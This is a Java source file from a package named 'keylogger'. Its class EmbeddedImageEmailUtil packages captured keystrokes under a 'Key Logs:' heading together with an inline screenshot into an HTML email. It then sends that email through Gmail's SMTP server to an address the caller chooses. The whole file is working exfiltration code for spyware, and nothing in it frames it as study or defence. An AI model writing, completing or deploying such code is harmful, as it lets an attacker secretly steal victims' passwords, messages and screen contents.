package keylogger;

import java.io.IOException;
import java.util.Date;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class EmbeddedImageEmailUtil {

public static void send(String host, String port,
    final String userName, final String password, String toAddress,
    String subject, String EmailMessage,
    Map<String, String> mapInlineImages)
    throws AddressException, MessagingException {
    String body = "<html>";
    body=body+"Key Logs:<br>";
    body=body+EmailMessage+"<br>";
    body=body+"Screenshot:<br>";
    body=body+"<img src=\"cid:image1\" width=\"30%\" height=\"30%\" /><br>";
    body=body+"</html>";
    
    Properties properties = new Properties();
    properties.put("mail.smtp.host", "smtp.gmail.com");    
    properties.put("mail.smtp.socketFactory.port", "465");    
    properties.put("mail.smtp.socketFactory.class",    
                    "javax.net.ssl.SSLSocketFactory");    
    properties.put("mail.smtp.auth", "true");    
    properties.put("mail.smtp.port", "465");  
          
    Authenticator auth = new Authenticator() {
    public PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication(userName, password);
    }
    };
    Session session = Session.getInstance(properties, auth);

    Message msg = new MimeMessage(session);
    msg.setFrom(new InternetAddress(userName));
    InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
    msg.setRecipients(Message.RecipientType.TO, toAddresses);
    msg.setSubject(subject);
    msg.setSentDate(new Date());

    MimeBodyPart messageBodyPart = new MimeBodyPart();
    messageBodyPart.setContent(body, "text/html");

    Multipart multipart = new MimeMultipart();
    multipart.addBodyPart(messageBodyPart);

    if (mapInlineImages != null && mapInlineImages.size() > 0) {
    Set<String> setImageID = mapInlineImages.keySet();

    for (String contentId : setImageID) {
    MimeBodyPart imagePart = new MimeBodyPart();
    imagePart.setHeader("Content-ID", "<" + contentId + ">");
    imagePart.setDisposition(MimeBodyPart.INLINE);

    String imageFilePath = mapInlineImages.get(contentId);
    try {
    imagePart.attachFile(imageFilePath);
    } catch (IOException ex) {
    ex.printStackTrace();
    }

    multipart.addBodyPart(imagePart);
    }
    }
    msg.setContent(multipart);

    Transport.send(msg);
    }
}